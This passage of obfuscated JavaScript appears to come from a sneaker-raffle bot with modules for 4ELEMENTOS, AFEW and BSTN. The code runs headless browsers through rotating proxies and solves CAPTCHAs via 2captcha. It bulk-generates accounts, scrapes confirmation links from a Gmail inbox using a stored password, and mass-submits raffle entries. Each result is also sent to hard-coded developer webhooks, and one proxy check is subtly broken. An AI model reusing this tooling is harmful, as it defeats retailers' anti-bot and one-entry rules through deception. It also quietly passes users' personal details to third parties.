                                    '--proxy-server=' + _0x11384e[0x0] + ':' + _0x11384e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4ddb08 = await _0x198f78['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x11384e[0x0] + ':' + _0x11384e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x223c9e() + '\x20[' + _0x4661ec['name'] + ']\x20Task\x20' + (_0x5aa9f7 + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x1ad2e5 = await _0x4ddb08['newPage']();
                            await _0x1ad2e5['authenticate']({
                                'username': '' + _0x11384e[0x2],
                                'password': '' + _0x11384e[0x3]
                            }), await _0x1ad2e5['setRequestInterception'](!![]), _0x1ad2e5['on']('request', _0x5d3686 => {
                                _0x5d3686['resourceType']() === 'image' || _0x5d3686['resourceType']() === 'font' || _0x5d3686['resourceType']() === 'media' ? _0x5d3686['abort']() : _0x5d3686['continue']();
                            }), await _0x1ad2e5['goto'](_0x375ac9[_0x5aa9f7]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x223c9e() + '\x20[' + _0x4661ec['name'] + ']\x20Task\x20' + (_0x5aa9f7 + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x1ad2e5['waitForSelector']('#accept-all-gdpr'), await _0x1ad2e5['click']('#accept-all-gdpr'), await _0x1ad2e5['waitForSelector']('#raffles-product'), await _0x1a79bd(0x3e8), await _0x1ad2e5['$eval']('#raffles-product', _0x2769a7 => _0x2769a7['click']()), await _0x1a79bd(0x1388), await _0x1ad2e5['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x2f93d2 = await _0x1ad2e5['$']('.fancybox-inner\x20>\x20iframe'), _0x5ab739 = await _0x2f93d2['contentFrame']();
                            console['log'](_0x223c9e() + '\x20[' + _0x4661ec['name'] + ']\x20Task\x20' + (_0x5aa9f7 + 0x1) + '\x20:\x20Checking\x20Information'), await _0x5ab739['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x1a79bd(0x1f4), await _0x5ab739['type']('input[name=\x22sm-form-email\x22]', _0x375ac9[_0x5aa9f7]['Email']), await _0x1a79bd(0xc8), await _0x5ab739['type']('input[name=\x22sm-form-name\x22]', _0x375ac9[_0x5aa9f7]['FirstName'] + '\x20' + _0x375ac9[_0x5aa9f7]['LastName']), await _0x1a79bd(0xc8), await _0x5ab739['type']('input[name=\x22sm-form-street\x22]', _0x375ac9[_0x5aa9f7]['Address1'] + '\x20' + _0x375ac9[_0x5aa9f7]['HouseNumber'] + '\x20' + _0x375ac9[_0x5aa9f7]['Address2']), await _0x1a79bd(0xc8), await _0x5ab739['type']('input[name=\x22sm-form-city\x22]', _0x375ac9[_0x5aa9f7]['City']), await _0x1a79bd(0xc8), await _0x5ab739['type']('input[name=\x22sm-form-province\x22]', _0x375ac9[_0x5aa9f7]['State']), await _0x1a79bd(0xc8), await _0x5ab739['type']('input[name=\x22sm-form-zip\x22]', _0x375ac9[_0x5aa9f7]['Zip']), await _0x1a79bd(0xc8), await _0x5ab739['type']('input[name=\x22sm-form-country\x22]', _0x375ac9[_0x5aa9f7]['Country']), await _0x1a79bd(0xc8), await _0x5ab739['type']('input[name=\x22sm-form-phone\x22]', _0x375ac9[_0x5aa9f7]['Phone']), await _0x1a79bd(0xc8), await _0x5ab739['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x375ac9[_0x5aa9f7]['Follower']), await _0x1a79bd(0xc8), await _0x5ab739['type']('input[name=\x22sm-cst.size\x22]', _0x375ac9[_0x5aa9f7]['Size']), await _0x1a79bd(0x1f4), await _0x5ab739['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x1a79bd(0x1f4), await _0x5ab739['click']('.icheckbox_simple-custom'), await _0x1a79bd(0x1f4), console['log'](_0x223c9e() + '\x20[' + _0x4661ec['name'] + ']\x20Task\x20' + (_0x5aa9f7 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x5ab739['$eval']('form', _0x1e2e4b => _0x1e2e4b['submit']()), console['log'](_0x41d282['green'](_0x223c9e() + '\x20[' + _0x4661ec['name'] + ']\x20Task\x20' + (_0x5aa9f7 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x1e91db = '';
                            var _0x385667 = await _0x550a27(_0x375ac9[_0x5aa9f7], _0x4661ec, 'dev', ![]), _0x2e308b = await _0x550a27(_0x375ac9[_0x5aa9f7], _0x4661ec, 'pub', ![]);
                            const _0x5b6a9f = {
                                'succesDEVMSG': { 'embeds': [_0x385667] },
                                'succesPUBMSG': { 'embeds': [_0x2e308b] }
                            };
                            try {
                                _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x5b6a9f['succesDEVMSG']), await _0x1a79bd(0xc8), await _0x21228b(_0x152092, _0x5b6a9f['succesDEVMSG']), await _0x1a79bd(0xc8), await _0x21228b(_0x136ee7, _0x5b6a9f['succesPUBMSG']);
                            } catch (_0x101d92) {
                                console['log'](_0x41d282['yellow'](_0x223c9e() + '\x20[' + _0x4661ec['name'] + ']\x20Task\x20' + (_0x5aa9f7 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x101d92));
                            }
                        } catch (_0x3d1613) {
                            console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x4661ec['name'] + ']\x20Task\x20' + (_0x5aa9f7 + 0x1) + '\x20:\x20' + _0x3d1613)), _0x2ae2cd = '' + _0x3d1613;
                            var _0x15c2f0 = await _0x550a27(_0x375ac9[_0x5aa9f7], _0x4661ec, 'dev', !![], _0x2ae2cd), _0x385667 = await _0x550a27(_0x375ac9[_0x5aa9f7], _0x4661ec, 'dev', ![]), _0x2e308b = await _0x550a27(_0x375ac9[_0x5aa9f7], _0x4661ec, 'pub', ![]);
                            const _0x27d28c = {
                                'succesDEVMSG': { 'embeds': [_0x385667] },
                                'succesPUBMSG': { 'embeds': [_0x2e308b] }
                            };
                            _0x27d28c['errorDEV'] = { 'embeds': [_0x15c2f0] }, _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x27d28c['errorDEV']), await _0x21228b(_0x549818, _0x27d28c['errorDEV']), _0x3d1613 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x1e91db = 'yes');
                        } finally {
                            _0x4ddb08['close']();
                            if (_0x1e91db == 'yes' && _0x4f9a45 != 0x5 && _0x2ae2cd != 'Size\x20Not\x20Found') {
                                console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x4661ec['name'] + ']\x20Task\x20' + (_0x5aa9f7 + 0x1) + '\x20:\x20Retrying')), _0x5aa9f7 = _0x5aa9f7 - 0x1, _0x4f9a45 = _0x4f9a45 + 0x1;
                                continue;
                            }
                            _0x1e91db == 'yes' && _0x4f9a45 >= 0x5 && (_0x2e4d36(_0x375ac9[_0x5aa9f7], _0x4661ec), _0x1e91db = 'no', _0x4f9a45 = 0x0), console['log'](_0x223c9e() + '\x20[' + _0x4661ec['name'] + ']\x20Waiting\x20for\x20' + _0x37a01c['delay'] + '\x20ms'), await _0x1a79bd(_0x37a01c['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x55b3f3, _0x3a1207) {
                    var _0x2b3b26 = [];
                    async function _0x46d242() {
                        var _0x387334 = new _0x27a360({
                            'user': _0x37a01c['masterMail'],
                            'password': _0x37a01c['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x2614a5(_0x510515) {
                            _0x387334['openBox']('INBOX', ![], _0x510515);
                        }
                        _0x387334['once']('ready', function () {
                            _0x2614a5(function (_0x2cdb45, _0x27a033) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x2cdb45)
                                    throw _0x2cdb45;
                                _0x387334['seq']['search'](['UNSEEN'], function (_0x504bf7, _0x2b996e) {
                                    if (!_0x2b996e || !_0x2b996e['length'])
                                        console['log'](_0x223c9e() + '\x20[' + _0x55b3f3['name'] + ']\x20No\x20mails\x20found'), _0x387334['end']();
                                    else {
                                        var _0x11a396 = _0x387334['seq']['fetch'](_0x2b996e, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x11a396['on']('message', function (_0x8a34ab, _0x1f3157) {
                                            var _0x3c4caa = '(#' + _0x1f3157 + ')\x20';
                                            _0x8a34ab['on']('body', function (_0x464e7f, _0x4b3a5e) {
                                                _0x5d77b8(_0x464e7f, (_0x2f7514, _0x66cce1) => {
                                                    if (_0x66cce1['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0xbb10e9 = _0x66cce1['html']['split']('\x0a');
                                                        for (var _0x5d8aa5 = 0x0; _0x5d8aa5 < _0xbb10e9['length']; _0x5d8aa5++) {
                                                            if (_0xbb10e9[_0x5d8aa5]['includes']('salesmanago') && _0xbb10e9[_0x5d8aa5]['includes']('<td') && _0xbb10e9[_0x5d8aa5]['includes']('href')) {
                                                                var _0x1896be = _0xbb10e9[_0x5d8aa5]['split']('href=\x22'), _0x9b4b36 = _0x1896be[0x1]['split']('\x22')[0x0];
                                                                _0x2b3b26['push'](_0x9b4b36);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x8a34ab['once']('end', function () {
                                            });
                                        }), _0x11a396['once']('error', function (_0x5949fb) {
                                            console['log']('Fetch\x20error:\x20' + _0x5949fb);
                                        }), _0x11a396['once']('end', function () {
                                            _0x387334['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x387334['once']('error', function (_0x173541) {
                            console['log'](_0x41d282['red'](_0x173541['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x387334['once']('end', async function () {
                        }), _0x387334['connect']();
                    }
                    async function _0x4ac042(_0x89cd88, _0x31cf94, _0xf600f7) {
                        for (var _0x2567bb = 0x0; _0x2567bb < _0x31cf94['length']; _0x2567bb++) {
                            async function _0x1f15f2(_0x6d9caa, _0x1bd00a, _0x4867c6, _0x32d9b3, _0x3495ae) {
                                var _0x3d53c4, _0x313ffa = {}, _0x40f188 = [], _0xefe636 = {}, _0x72bbdd = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x1063bb = Math['round'](Math['random']() * (_0x72bbdd['length'] - 0x1));
                                _0x32d9b3[_0x6d9caa]['Size'] == 'RANDOM' && (_0x32d9b3[_0x6d9caa]['Size'] = _0x72bbdd[_0x1063bb]);
                                !_0x32d9b3 && (_0x32d9b3 = {});
                                if (_0x37a01c['useRandomProxy'] = ![])
                                    var _0x3e1d07 = _0x3495ae[_0x6d9caa]['split'](':');
                                else
                                    var _0x428f16 = Math['round'](Math['random']() * (_0x3495ae['length'] - 0x1)), _0x3e1d07 = _0x3495ae[_0x428f16]['split'](':');
                                var _0x2731f1 = {
                                    'jar': _0x2b4f8d,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x4867c6['url'],
                                    'headers': _0x4867c6['headers'],
                                    'body': JSON['stringify'](_0x313ffa),
                                    'proxy': 'http://' + _0x3e1d07[0x2] + ':' + _0x3e1d07[0x3] + '@' + _0x3e1d07[0x0] + ':' + _0x3e1d07[0x1]
                                };
                                return _0x1bd00a != 'ver' && (_0x2731f1['url'] = _0x4867c6['url'], _0x2731f1['headers'] = _0x4867c6['headers']), _0x1bd00a == 'ver' && (_0x2731f1['method'] = 'GET', _0x2731f1['url'] = _0x32d9b3[_0x6d9caa]), new Promise(function (_0x127b0c, _0x2b6858) {
                                    callback = async (_0x431ce0, _0x1cfaba, _0x5046df) => {
                                        if (!_0x431ce0 && _0x1cfaba['statusCode'] == 0xca || !_0x431ce0 && _0x1cfaba['statusCode'] == 0xc8) {
                                            if (_0x1bd00a != 'ver') {
                                                var _0x446cd2 = await _0x550a27(_0x32d9b3[_0x6d9caa], _0x4867c6, 'dev', ![]), _0x135867 = await _0x550a27(_0x32d9b3[_0x6d9caa], _0x4867c6, 'pub', ![]);
                                                const _0x3eee63 = {
                                                    'succesDEVMSG': { 'embeds': [_0x446cd2] },
                                                    'succesPUBMSG': { 'embeds': [_0x135867] }
                                                };
                                                if (_0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '')
                                                    try {
                                                        await _0x21228b(_0x37a01c['webhook'], _0x3eee63['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x1a79bd(0xc8), await _0x21228b(_0x152092, _0x3eee63['succesDEVMSG']), await _0x1a79bd(0xc8);
                                                try {
                                                    await _0x21228b(_0x136ee7, _0x3eee63['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x4c6d06(_0x32d9b3[_0x6d9caa], _0x4867c6);
                                            }
                                            _0x127b0c(console['log'](_0x41d282['green'](_0x223c9e() + '\x20[' + _0x4867c6['name'] + ']\x20Task\x20' + (_0x6d9caa + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x1bd00a != 'ver') {
                                                var _0x2db886 = '' + _0x431ce0, _0x23f5c5 = await _0x550a27(_0x32d9b3[_0x6d9caa], _0x4867c6, 'dev', !![], _0x2db886), _0x1401ad = {};
                                                _0x1401ad['errorDEV'] = { 'embeds': [_0x23f5c5] }, _0x2e4d36(_0x32d9b3[_0x6d9caa], _0x4867c6), _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x1401ad['errorDEV']), await _0x21228b(_0x549818, _0x1401ad['errorDEV']);
                                            }
                                            _0x2b6858(console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x4867c6['name'] + ']\x20Task\x20' + (_0x6d9caa + 0x1) + ':\x20' + _0x431ce0)));
                                        }
                                    };
                                    try {
                                        _0x1bd00a != 'ver' ? console['log'](_0x223c9e() + '\x20[' + _0x4867c6['name'] + ']\x20Task\x20' + (_0x6d9caa + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x313ffa['data']['attributes']['email']) : console['log'](_0x223c9e() + '\x20[' + _0x4867c6['name'] + ']\x20Task\x20' + (_0x6d9caa + 0x1) + ':\x20Fetching\x20Response'), _0x45dd39(_0x2731f1, callback);
                                    } catch (_0x5f4415) {
                                        console['log'](_0x223c9e() + '\x20Task\x20' + (_0x6d9caa + 0x1) + ':\x20' + _0x5f4415);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x1f15f2(_0x2567bb, 'ver', _0x89cd88, _0x31cf94, _0xf600f7), console['log'](_0x223c9e() + '\x20[' + _0x89cd88['name'] + ']\x20Sleeping\x20for\x20' + _0x37a01c['delay'] + '\x20ms'), await _0x1a79bd(_0x37a01c['delay']);
                            } catch (_0x22ea84) {
                            }
                        }
                    }
                    try {
                        _0x46d242(), await _0x1a79bd(0xfa0), console['log']('Found\x20' + _0x2b3b26['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x4ac042(_0x55b3f3, _0x2b3b26, _0x3a1207);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x4693c2, _0x311673, _0x5dd328) {
                for (var _0x13ae27 = 0x0; _0x13ae27 < _0x311673['length']; _0x13ae27++) {
                    _0x37a01c['AfewDelay'] = _0x37a01c['delay'];
                    var _0xa60d6d;
                    if (_0x315dd1 != 'yes')
                        var _0x315dd1 = '', _0x164387 = 0x0;
                    var _0x195e98 = _0x311673[_0x13ae27]['Url'];
                    _0x219354(_0x4693c2['name'] + '\x20Task\x20' + (_0x13ae27 + 0x1) + '\x20/\x20' + _0x311673['length'] + '\x20||\x20File:\x20' + _0x4e44e9 + '\x20Proxies:\x20' + _0xd50a79), await _0x170817(_0x311673, _0x13ae27);
                    var _0x284f47 = await _0x550a27(_0x311673[_0x13ae27], _0x4693c2, 'dev', ![]), _0x7d5bc8 = await _0x550a27(_0x311673[_0x13ae27], _0x4693c2, 'pub', ![]);
                    const _0x529847 = {
                        'succesDEVMSG': { 'embeds': [_0x284f47] },
                        'succesPUBMSG': { 'embeds': [_0x7d5bc8] }
                    };
                    if (_0x311673[_0x13ae27]['Email'] == '' || _0x311673[_0x13ae27]['FirstName'] == '' || _0x311673[_0x13ae27]['LastName'] == '' || _0x311673[_0x13ae27]['Country'] == '' || _0x311673[_0x13ae27]['Size'] == '' || _0x311673[_0x13ae27]['Address1'] == '' || _0x311673[_0x13ae27]['Zip'] == '') {
                        console['log'](_0x223c9e() + '\x20[' + _0x4693c2['name'] + ']\x20Task\x20' + (_0x13ae27 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x37a01c['useRandomProxy'] = ![])
                        var _0x4a8c9b = _0x5dd328[_0x13ae27]['split'](':');
                    else
                        var _0x3a445c = Math['round'](Math['random']() * (_0x5dd328['length'] - 0x1)), _0x4a8c9b = _0x5dd328[_0x3a445c]['split'](':');
                    const _0x250928 = await _0x198f78['launch']({
                        'headless': !![],
                        'args': [
                            '--proxy-server=' + _0x4a8c9b[0x0] + ':' + _0x4a8c9b[0x1],
                            '--no-sandbox',
                            '--disable-setuid-sandbox'
                        ]
                    });
                    try {
                        const _0x16d7b9 = await _0x250928['newPage']();
                        await _0x16d7b9['setDefaultNavigationTimeout'](0x1d4c0), await _0x16d7b9['authenticate']({
                            'username': '' + _0x4a8c9b[0x2],
                            'password': '' + _0x4a8c9b[0x3]
                        }), console['log'](_0x223c9e() + '\x20[' + _0x4693c2['name'] + ']\x20Task\x20' + (_0x13ae27 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x16d7b9['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x16d7b9['setRequestInterception'](!![]), _0x16d7b9['on']('request', _0x5e0456 => {
                            _0x5e0456['resourceType']() === 'image' || _0x5e0456['resourceType']() === 'font' || _0x5e0456['resourceType']() === 'media' ? _0x5e0456['abort']() : _0x5e0456['continue']();
                        }), await _0x16d7b9['goto'](_0x195e98, { 'waitUntil': 'networkidle2' }), console['log'](_0x223c9e() + '\x20[' + _0x4693c2['name'] + ']\x20Task\x20' + (_0x13ae27 + 0x1) + '\x20:\x20Gathering\x20cookies'), await _0x16d7b9['waitForTimeout'](0xfa0), console['log'](_0x223c9e() + '\x20[' + _0x4693c2['name'] + ']\x20Task\x20' + (_0x13ae27 + 0x1) + '\x20:\x20Cookies\x20received'), await _0x16d7b9['waitForTimeout'](0x320);
                        if (_0x311673[_0x13ae27]['Size'] == 'RANDOM') {
                            console['log'](_0x223c9e() + '\x20[' + _0x4693c2['name'] + ']\x20Task\x20' + (_0x13ae27 + 0x1) + '\x20:\x20Choosing\x20random\x20size');
                            const _0xb89eff = await _0x16d7b9['$$eval']('div.size-picker.mt-2\x20>\x20ul\x20>\x20li\x20>\x20a', _0x273942 => {
                                return _0x273942['map'](_0x1fed12 => _0x1fed12['href']);
                            });
                            var _0x591c79 = Math['round'](Math['random']() * (_0xb89eff['length'] - 0x1));
                            await _0x16d7b9['goto']('' + _0xb89eff[_0x591c79]);
                        } else {
                            console['log'](_0x223c9e() + '\x20[' + _0x4693c2['name'] + ']\x20Task\x20' + (_0x13ae27 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x311673[_0x13ae27]['Size']);
                            try {
                                const _0x379a9e = await _0x16d7b9['$$eval']('li[data-original-title=\x22Größe\x20in\x20EU:\x20' + _0x311673[_0x13ae27]['Size'] + '\x22]\x20>\x20a', _0x31808b => {
                                    return _0x31808b['map'](_0x168762 => _0x168762['href']);
                                });
                                await _0x16d7b9['goto']('' + _0x379a9e[0x0], { 'waitUntil': 'networkidle2' });
                            } catch (_0x36fba1) {
                                console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x4693c2['name'] + ']\x20Task\x20' + (_0x13ae27 + 0x1) + '\x20:\x20' + _0x36fba1 + '\x20Size\x20not\x20found')), _0xa60d6d = 'Size\x20Not\x20Found';
                                var _0x2e853d = await _0x550a27(_0x311673[_0x13ae27], _0x4693c2, 'dev', !![], _0xa60d6d);
                                _0x529847['errorDEV'] = { 'embeds': [_0x2e853d] };
                                _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x529847['errorDEV']);
                                await _0x21228b(_0x549818, _0x529847['errorDEV']);
                                continue;
                            }
                        }
                        await _0x16d7b9['waitForTimeout'](0x258), await _0x16d7b9['type']('#raffle-instagram', '' + _0x311673[_0x13ae27]['Follower'], { 'delay': 0x64 }), await _0x16d7b9['waitForTimeout'](0x384), await _0x16d7b9['click']('#raffle-terms'), await _0x16d7b9['waitForTimeout'](0x384), await _0x16d7b9['evaluate'](() => {
                            const _0x3717c2 = document['querySelector']('button.btn[name=\x27add\x27]');
                            _0x3717c2['click']();
                        }), await _0x16d7b9['waitForTimeout'](0xbb8), await _0x16d7b9['waitForSelector']('#checkout_email'), await _0x1a79bd(0x3e8), console['log'](_0x223c9e() + '\x20[' + _0x4693c2['name'] + ']\x20Task\x20' + (_0x13ae27 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x16d7b9['type']('#checkout_email', '' + _0x311673[_0x13ae27]['Email'], 0x32), await _0x1a79bd(0x320), await _0x16d7b9['select']('#checkout_shipping_address_country', '' + _0x311673[_0x13ae27]['Country']), await _0x16d7b9['waitForTimeout'](0x258), await _0x16d7b9['type']('#checkout_shipping_address_first_name', '' + _0x311673[_0x13ae27]['FirstName']), await _0x16d7b9['waitForTimeout'](0x320), await _0x16d7b9['type']('#checkout_shipping_address_last_name', '' + _0x311673[_0x13ae27]['LastName']), await _0x16d7b9['waitForTimeout'](0x2bc), await _0x16d7b9['type']('#checkout_shipping_address_address1', _0x311673[_0x13ae27]['Address1'] + '\x20' + _0x311673[_0x13ae27]['HouseNumber']), await _0x16d7b9['waitForTimeout'](0x2bc), await _0x16d7b9['type']('#checkout_shipping_address_address2', '' + _0x311673[_0x13ae27]['Address2']), await _0x16d7b9['waitForTimeout'](0x2bc);
                        _0x311673[_0x13ae27]['Postcode'] == undefined ? await _0x16d7b9['type']('#checkout_shipping_address_zip', '' + _0x311673[_0x13ae27]['Zip']) : await _0x16d7b9['type']('#checkout_shipping_address_zip', '' + _0x311673[_0x13ae27]['Postcode']);
                        await _0x16d7b9['waitForTimeout'](0x2bc), await _0x16d7b9['type']('#checkout_shipping_address_city', '' + _0x311673[_0x13ae27]['City']), await _0x16d7b9['waitForTimeout'](0x2bc), console['log'](_0x223c9e() + '\x20[' + _0x4693c2['name'] + ']\x20Task\x20' + (_0x13ae27 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x16d7b9, _0x16d7b9['evaluate'](() => {
                            const _0x40c57f = document['querySelector']('#continue_button');
                            for (var _0xfaae62 = 0x0; _0xfaae62 < 0x5; _0xfaae62++) {
                                if (_0x40c57f) {
                                    _0x40c57f['click'](), _0x40c57f['click']();
                                    break;
                                } else
                                    _0x1a79bd(0xfa0);
                            }
                        }), await _0x16d7b9['waitForTimeout'](0x1194);
                        try {
                            await _0x16d7b9['waitForSelector']('div.radio-wrapper', { 'timeout': 0x186a0 });
                        } catch {
                            console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x4693c2['name'] + ']\x20Task\x20' + (_0x13ae27 + 0x1) + '\x20:\x20Proxy\x20Error'));
                            continue;
                        }
                        _0x16d7b9['evaluate'](() => {
                            const _0x24aa55 = document['querySelector']('#continue_button');
                            for (var _0x263b92 = 0x0; _0x263b92 < 0x5; _0x263b92++) {
                                if (_0x24aa55) {
                                    _0x24aa55['click']();
                                    break;
                                } else
                                    _0x1a79bd(0xfa0);
                            }
                        }), await _0x16d7b9['waitForTimeout'](0x7d0), console['log'](_0x223c9e() + '\x20[' + _0x4693c2['name'] + ']\x20Task\x20' + (_0x13ae27 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x16d7b9['waitForSelector']('#continue_button', { 'timeout': 0x186a0 }), _0x16d7b9['evaluate'](() => {
                            const _0x55a711 = document['querySelector']('#continue_button');
                            for (var _0x499b56 = 0x0; _0x499b56 < 0x5; _0x499b56++) {
                                if (_0x55a711) {
                                    _0x55a711['click']();
                                    break;
                                } else
                                    _0x1a79bd(0xfa0);
                            }
                        }), await _0x16d7b9['waitForTimeout'](0x1194), await _0x16d7b9['waitForSelector']('#continue_button'), _0x16d7b9['evaluate'](() => {
                            const _0x465fb2 = document['querySelector']('#continue_button');
                            for (var _0x1a526b = 0x0; _0x1a526b < 0x5; _0x1a526b++) {
                                if (_0x465fb2) {
                                    _0x465fb2['click']();
                                    break;
                                } else
                                    _0x1a79bd(0xfa0);
                            }
                        });
                        try {
                            await _0x16d7b9['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x315dd1 = 'no', _0x4c6d06(_0x311673[_0x13ae27], _0x4693c2), console['log'](_0x41d282['green'](_0x223c9e() + '\x20[' + _0x4693c2['name'] + ']\x20Task\x20' + (_0x13ae27 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '')
                                try {
                                    await _0x21228b(_0x37a01c['webhook'], _0x529847['succesDEVMSG']);
                                } catch {
                                }
                            await _0x1a79bd(0xc8), await _0x21228b(_0x152092, _0x529847['succesDEVMSG']), await _0x1a79bd(0xc8);
                            try {
                                await _0x21228b(_0x136ee7, _0x529847['succesPUBMSG']);
                            } catch {
                            }
                        } catch (_0x4f85ef) {
                            console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x4693c2['name'] + ']\x20Task\x20' + (_0x13ae27 + 0x1) + '\x20:\x20Entry\x20Failed:\x20' + _0x4f85ef));
                        }
                    } catch (_0x5f0682) {
                        console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x4693c2['name'] + ']\x20Task\x20' + (_0x13ae27 + 0x1) + '\x20:\x20' + _0x5f0682)), _0xa60d6d = '' + _0x5f0682;
                        var _0x2e853d = await _0x550a27(_0x311673[_0x13ae27], _0x4693c2, 'dev', !![], _0xa60d6d);
                        _0x529847['errorDEV'] = { 'embeds': [_0x2e853d] }, _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x529847['errorDEV']), await _0x21228b(_0x549818, _0x529847['errorDEV']), _0x315dd1 = 'yes';
                    } finally {
                        _0x250928 && _0x250928['close']();
                        if (_0x315dd1 == 'yes' && _0x164387 != 0x5 && _0xa60d6d != 'Size\x20Not\x20Found') {
                            console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x4693c2['name'] + ']\x20Task\x20' + (_0x13ae27 + 0x1) + '\x20:\x20Retrying')), _0x13ae27 = _0x13ae27 - 0x1, _0x164387 = _0x164387 + 0x1;
                            continue;
                        }
                        _0x315dd1 == 'yes' && _0x164387 >= 0x5 && (_0x2e4d36(_0x311673[_0x13ae27], _0x4693c2), _0x315dd1 = 'no', _0x164387 = 0x0);
                        if (_0x13ae27 + 0x1 == _0x311673['length']) {
                            await _0x1a79bd(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x37a01c['AfewDelay'] + '\x20ms'), await _0x1a79bd(_0x37a01c['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x1ad403, _0xdca68b, _0x28f6da) {
                    _0x198f78['use'](_0x538ad0()), _0x198f78['use'](_0x3393bf({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x37a01c['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3046b5 = 0x0; _0x3046b5 < _0xdca68b['length']; _0x3046b5++) {
                        if (_0x1883fa != 'yes')
                            var _0x1883fa = '', _0x1a4d79 = 0x0;
                        var _0x57ff35;
                        await _0x170817(_0xdca68b, _0x3046b5), _0x219354(_0x1ad403['name'] + '\x20Task\x20' + (_0x3046b5 + 0x1) + '\x20/\x20' + _0xdca68b['length'] + '\x20||\x20File:\x20' + _0x4e44e9 + '\x20Proxies:\x20' + _0xd50a79);
                        var _0x49cbee = await _0x550a27(_0xdca68b[_0x3046b5], _0x1ad403, 'acc', ![]);
                        const _0x336a6e = { 'succesDEVMSG': { 'embeds': [_0x49cbee] } }, _0x58744e = 'https://www.bstn.com/eu_en/customer/account/create/';
